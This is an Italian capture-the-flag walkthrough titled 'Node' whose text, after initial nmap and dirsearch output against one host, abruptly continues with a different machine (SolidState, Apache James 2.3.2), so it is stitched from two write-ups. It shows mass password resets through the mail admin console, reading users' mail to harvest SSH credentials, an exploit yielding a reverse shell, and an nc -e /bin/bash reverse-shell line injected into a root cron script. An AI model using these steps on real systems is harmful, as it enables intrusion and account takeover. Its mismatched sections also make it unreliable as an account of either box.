# Node

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con nmap per conoscere le porte aperte e i servizi che girano su di esse.

```text
sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.10.58
```

* **-sC**: scipt nmap di default
* **-sV**: per rilevare la versione dei servizi
* **-O**: per rilevare il SO
* **-oA**: per stampare tutti i formati e salvarli nel file _nmap/initial_

Il risultato della scansione è il seguente:

```text
Nmap scan report for 10.10.10.58
Host is up (0.061s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-tasktracker Apache Hadoop
| hadoop-tasktracker-info:
|_  Logs: /login
|_http-title: MyPlace
| hadoop-datanode-info:
|_  Logs: /login
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (89%), Android 4.1.1 (89%), Linux 3.10 - 4.11 (89%), Linux 3.12 (89%), Linux 3.13 (89%), Linux 3.13 or 4.2 (89%), Linux 3.16 (89%), Linux 3.16 - 4.6 (89%), Linux 3.18 (89%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

Innanzitutto, vedo cosa c'è sulla porta 3000:

<p align="center">
  <img src="/Immagini/Linux-Box/Node/node-1.png" />
</p>

Utilizzo _dirsearch_, dal quale ottengo il seguente risultato:

```text
Target: http://10.10.10.58:3000/

[09:19:33] Starting:
[09:25:52] 301 -  171B  - /assets  ->  /assets/
[09:31:26] 301 -  173B  - /uploads  ->  /uploads/

Task Completed
```

Non trovando nulla di interessante visito la pagina http://10.10.10.51:4555:

<p align="center">
  <img src="/Immagini/Linux-Box/SolidState/solidstate-2.png" />
</p>

Facendo una rapida ricerca tramite _searchsploit_ trovo questo:

```text
----------------------------------------------- ---------------------------------
 Exploit Title                                 |  Path
----------------------------------------------- ---------------------------------
Apache James Server 2.3.2 - Insecure User Crea | linux/remote/48130.rb
Apache James Server 2.3.2 - Remote Command Exe | linux/remote/35513.py
Apache James Server 2.3.2 - Remote Command Exe | linux/remote/50347.py
----------------------------------------------- ---------------------------------
```

Scarico il terzo file della lista e studio il suo funzionamento. Per poter utilizzarlo occorrono le credenziali.

Provo a connettermi tramite netcat alla porta 4555:

<p align="center">
  <img src="/Immagini/Linux-Box/SolidState/solidstate-3.png" />
</p>

## Exploitation

Utilizzo il comando HELP per stampare la lista dei comandi disponibili:

```text
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```

Utilizzo il comando _listusers_:

```text
Existing accounts 6
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

Successivamente, utilizzo il comando _setpassword_ per cambiare la password in **password** a tutti gli utenti della lista.

```text
setpassword james password
Password for james reset
setpassword thomas password
Password for thomas reset
setpassword john password
Password for john reset
setpassword mindy password
Password for mindy reset
setpassword mailadmin password
Password for mailadmin reset
```

Ora provo ad accedere, tramite il comando _telnet_, alla porta 110. Per farlo utilizzo le credenziali degli utenti precedentemente ottenute (e modificate).

Gli unici utenti che hanno materiale interessante sono john e mindy.

**JOHN**

```text
telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
USER john
+OK
PASS password
+OK Welcome john
LIST
+OK 1 743
1 743
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John,

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James

.
```

**MINDY**

```text
telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
USER mindy
+OK
PASS password
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security.

Respectfully,
James
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login.
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path.

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.
```

**Ho ottenuto le credenziali per l'utente mindy!**

Ora che ho le credenziali posso utilizzarle nello script scaricato precedentemente tramite _searchsploit_:

<p align="center">
  <img src="/Immagini/Linux-Box/SolidState/solidstate-4.png" />
</p>

Cosi facendo ottengo una reverse shell per l'utente mindy e conquisto il primo flag:

<p align="center">
  <img src="/Immagini/Linux-Box/SolidState/solidstate-5.png" />
</p>


## Privilege Escalation

Scarico ed eseguo gli script _LinEnum.sh_ e _pspy_ e scopro che c'è un file _/opt/tmp.py_ che viene eseguito molto frequentemente e sul quale tutti hanno i massimi privilegi:

<p align="center">
  <img src="/Immagini/Linux-Box/SolidState/solidstate-6.png" />
</p>

Quindi cambio il conenuto del file per creare una reverse shell con privilegi root:

```text
echo "os.system('/bin/nc -e /bin/bash 10.10.14.8 9999')" >> /opt/tmp.py
```

Avvio un listener e attendo l'esecuzione del cron job.

**Dopo qualche minuto sono root!**

<p align="center">
  <img src="/Immagini/Linux-Box/SolidState/solidstate-7.png" />
</p>
